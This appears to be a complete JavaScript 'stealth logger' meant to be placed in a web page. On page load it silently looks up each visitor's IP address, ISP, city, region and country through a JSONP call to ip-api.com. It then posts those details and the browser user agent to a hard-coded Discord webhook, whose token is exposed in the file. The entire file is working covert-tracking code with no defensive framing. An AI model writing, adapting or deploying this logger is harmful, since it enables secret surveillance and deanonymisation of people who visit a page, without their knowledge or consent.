const WEBHOOK_URL = 'https://discord.com/api/webhooks/1497258562165145683/NuNnv3wzsT3b1eSYIOZSYUpshbzrU1H2gSadr2YR5aPPH195LkjBCyATvRIUf5G4DY1K';

// Function to handle sending the data
async function sendData(geo) {
    const info = {
        ip: geo.query || "Unknown",
        city: geo.city || "Unknown",
        region: geo.regionName || "Unknown",
        country: geo.country || "Unknown",
        isp: geo.isp || "Unknown",
        userAgent: navigator.userAgent,
        timestamp: new Date().toLocaleString()
    };

    const payload = {
        username: "Final Stealth Logger",
        embeds: [{
            title: "📍 Full Data Captured (Local Fix)",
            color: 0x00f2ff,
            fields: [
                { name: "🌐 Network", value: `**IP:** \`${info.ip}\`\n**ISP:** ${info.isp}`, inline: false },
                { name: "🌍 Location", value: `**Country:** ${info.country}\n**Region:** ${info.region}\n**City:** ${info.city}`, inline: true },
                { name: "🕵️ Agent", value: `\`\`\`${info.userAgent}\`\`\`` }
            ],
            footer: { text: info.timestamp }
        }]
    };

    await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

// JSONP Callback
window.getGeo = function(data) {
    sendData(data);
};

// Main function
function init() {
    const script = document.createElement('script');
    // استخدام خدمة ip-api مع JSONP (تعمل بامتياز محلياً)
    script.src = 'http://ip-api.com/json/?callback=getGeo';
    document.body.appendChild(script);
}

window.onload = init;
